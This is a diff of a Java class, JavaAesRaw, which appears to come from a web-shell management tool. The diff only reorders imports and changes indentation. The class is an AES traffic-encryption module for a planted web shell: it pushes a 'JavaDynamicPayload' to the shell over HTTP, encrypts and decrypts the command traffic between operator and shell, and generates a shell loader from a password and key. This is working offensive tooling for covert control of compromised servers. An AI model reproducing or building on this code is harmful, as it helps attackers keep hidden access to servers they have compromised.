@@ -3,78 +3,79 @@ package shells.cryptions.JavaAes;
 import core.annotation.CryptionAnnotation;
 import core.imp.Cryption;
 import core.shell.ShellEntity;
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
 import util.Log;
 import util.functions;
 import util.http.Http;
 
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+
 @CryptionAnnotation(
-   Name = "JAVA_AES_RAW",
-   payloadName = "JavaDynamicPayload"
+        Name = "JAVA_AES_RAW",
+        payloadName = "JavaDynamicPayload"
 )
 public class JavaAesRaw implements Cryption {
-   private ShellEntity shell;
-   private Http http;
-   private Cipher decodeCipher;
-   private Cipher encodeCipher;
-   private String key;
-   private boolean state;
-   private byte[] payload;
+    private ShellEntity shell;
+    private Http http;
+    private Cipher decodeCipher;
+    private Cipher encodeCipher;
+    private String key;
+    private boolean state;
+    private byte[] payload;
 
-   public JavaAesRaw() {
-   }
+    public JavaAesRaw() {
+    }
 
-   public void init(ShellEntity context) {
-      this.shell = context;
-      this.http = this.shell.getHttp();
-      this.key = this.shell.getSecretKeyX();
+    public void init(ShellEntity context) {
+        this.shell = context;
+        this.http = this.shell.getHttp();
+        this.key = this.shell.getSecretKeyX();
 
-      try {
-         this.encodeCipher = Cipher.getInstance("AES");
-         this.decodeCipher = Cipher.getInstance("AES");
-         this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
-         this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
-         this.payload = this.shell.getPayloadModel().getPayload();
-         if (this.payload != null) {
-            this.http.sendHttpResponse(this.payload);
-            this.state = true;
-         } else {
-            Log.error("payload Is Null");
-         }
+        try {
+            this.encodeCipher = Cipher.getInstance("AES");
+            this.decodeCipher = Cipher.getInstance("AES");
+            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
+            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
+            this.payload = this.shell.getPayloadModel().getPayload();
+            if (this.payload != null) {
+                this.http.sendHttpResponse(this.payload);
+                this.state = true;
+            } else {
+                Log.error("payload Is Null");
+            }
 
-      } catch (Exception var3) {
-         Log.error(var3);
-      }
-   }
+        } catch (Exception var3) {
+            Log.error(var3);
+        }
+    }
 
-   public byte[] encode(byte[] data) {
-      try {
-         return this.encodeCipher.doFinal(data);
-      } catch (Exception var3) {
-         Log.error(var3);
-         return null;
-      }
-   }
+    public byte[] encode(byte[] data) {
+        try {
+            return this.encodeCipher.doFinal(data);
+        } catch (Exception var3) {
+            Log.error(var3);
+            return null;
+        }
+    }
 
-   public byte[] decode(byte[] data) {
-      try {
-         return this.decodeCipher.doFinal(data);
-      } catch (Exception var3) {
-         Log.error(var3);
-         return null;
-      }
-   }
+    public byte[] decode(byte[] data) {
+        try {
+            return this.decodeCipher.doFinal(data);
+        } catch (Exception var3) {
+            Log.error(var3);
+            return null;
+        }
+    }
 
-   public boolean isSendRLData() {
-      return false;
-   }
+    public boolean isSendRLData() {
+        return false;
+    }
 
-   public boolean check() {
-      return this.state;
-   }
+    public boolean check() {
+        return this.state;
+    }
 
-   public byte[] generate(String password, String secretKey) {
-      return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
-   }
+    public byte[] generate(String password, String secretKey) {
+        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
+    }
 }
